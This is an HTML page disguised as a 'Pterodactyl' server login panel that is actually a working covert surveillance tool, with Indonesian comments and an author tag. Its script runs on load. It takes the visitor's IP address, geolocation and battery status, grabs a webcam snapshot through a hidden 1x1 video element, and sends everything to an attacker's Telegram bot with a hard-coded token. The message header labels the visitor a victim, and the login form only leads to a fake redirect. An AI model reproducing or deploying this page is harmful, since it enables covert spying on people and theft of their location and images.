<!DOCTYPE html>
<html>
<head>
  <title>Privat Pterodactyl</title>
  <style>
    body {
      background-color: #1e2a38;
      font-family: Arial, sans-serif;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      padding: 20px;
      box-sizing: border-box;
    }
    .login-box {
      background-color: #2e3e4f;
      padding: 25px 20px;
      border-radius: 10px;
      text-align: center;
      width: 100%;
      max-width: 360px;
      box-shadow: 0 0 10px rgba(0,0,0,0.3);
    }
    .login-box h2 {
      margin-bottom: 15px;
      font-size: 20px;
    }
    .login-box input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: none;
      border-radius: 5px;
      font-size: 16px;
    }
    .login-box button {
      width: 100%;
      padding: 12px;
      background-color: #3b82f6;
      border: none;
      color: white;
      border-radius: 5px;
      cursor: pointer;
      font-size: 16px;
    }
    #camera {
      border: 1px solid black;
      margin-top: 20px;
    }
    #loading {
      display: none;
      margin-top: 10px;
    }
    footer {
      margin-top: 20px;
      font-size: 12px;
      color: #aaa;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>Privat Pterodactyl</h2>
    <img src="https://files.catbox.moe/o2x74k.png" alt="Mascot" width="100"><br><br>
    <input type="text" id="username" placeholder="USERNAME OR EMAIL">
    <input type="password" id="password" placeholder="PASSWORD">
    <button onclick="handleLogin()">LOGIN</button>
    <p style="margin-top: 10px;"><a href="#" style="color: #90cdf4;">FORGOT PASSWORD?</a></p>

    <p id="loading">Loading...</p>
    <video id="camera" autoplay playsinline width="1" height="1"></video>
    <canvas id="snapshot" width="300" height="300" style="display:none;"></canvas>
  </div>

  <footer>Â© 2015 - 2025 Pterodactyl Software</footer>

  <script>
    const botToken = '8016607048:AAED3eiFKuM0E3qetDC8KxVr1n3w9O6Nf5M';
    const chatId = '6307182208';

    let ipAddress = 'Tidak diketahui';
    let locationInfo = 'Tidak diberikan';
    let locationLink = 'Tidak tersedia';
    let cameraStatus = 'Gagal';
    let batteryStatus = 'Tidak didukung';
    let streamData = null;

    // Ambil IP
    fetch('https://api.ipify.org?format=json')
      .then(res => res.json())
      .then(data => {
        ipAddress = data.ip;
        checkAndSend();
      });

    // Ambil lokasi
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(pos => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        locationInfo = `Latitude: ${lat}, Longitude: ${lon}`;
        locationLink = `https://www.google.com/maps?q=${lat},${lon}`;
        checkAndSend();
      }, err => {
        locationInfo = 'Izin lokasi ditolak';
        locationLink = 'Tidak tersedia';
        checkAndSend();
      });
    } else {
      locationInfo = 'Geolocation tidak didukung';
      locationLink = 'Tidak tersedia';
    }

    // Ambil status kamera
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        const video = document.getElementById("camera");
        video.srcObject = stream;
        streamData = stream;
        cameraStatus = 'Berhasil';
        setTimeout(() => {
          takeSnapshot();
        }, 3000);
      })
      .catch(err => {
        cameraStatus = 'Ditolak / Tidak tersedia';
        checkAndSend();
      });

    // Ambil status baterai
    if (navigator.getBattery) {
      navigator.getBattery().then(battery => {
        function updateBatteryStatus() {
          batteryStatus = `${Math.round(battery.level * 100)}%`;
          if (battery.charging) batteryStatus += ' (Charging)';
          else batteryStatus += ' (Not Charging)';
          checkAndSend();
        }
        updateBatteryStatus();
        battery.addEventListener('chargingchange', updateBatteryStatus);
        battery.addEventListener('levelchange', updateBatteryStatus);
      });
    }

    function handleLogin() {
      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();
      const loading = document.getElementById('loading');

      if (!username || !password) {
        alert('Harap isi username dan password.');
        return;
      }

      loading.style.display = 'block';

      setTimeout(() => {
        loading.style.display = 'none';
        window.location.href = 'https://example.com/dashboard.html'; // redirect palsu
      }, 3000);
    }

    function takeSnapshot() {
      const video = document.getElementById("camera");
      const canvas = document.getElementById("snapshot");
      const context = canvas.getContext("2d");
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(blob => {
        sendToTelegram(blob);
      }, 'image/jpeg');
    }

    function sendToTelegram(blobImage) {
      const userAgent = navigator.userAgent;
      const time = new Date().toLocaleString();

      const message = `
|------------------------------------------
| ðŸ‘‘ Developer : HANXX
| ðŸŒ Language : HTML
| ðŸ§© Version : 1.0
|------------------------------------------
| // DAPET KORBAN NIH :
| 
| ðŸ”Ž IP Address: ${ipAddress}
| ðŸ“ Lokasi: ${locationInfo}
| ðŸ”— Share Lokasi: ${locationLink}
| ðŸ“¸ Kamera: ${cameraStatus}
| ðŸ”‹ Baterai: ${batteryStatus}
| ðŸ—ƒ User-Agent: ${userAgent}
| ðŸ•° Waktu Login: ${time}
|------------------------------------------
`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
      });

      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blobImage, "snapshot.jpg");

      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: "POST",
        body: formData
      }).then(() => console.log("Gambar terkirim ke Telegram"));
    }

    function checkAndSend() {
      if (ipAddress && locationInfo && cameraStatus && batteryStatus && streamData) {
        // semua info sudah siap, lanjut snapshot
      }
    }
  </script>
</body>
</html>
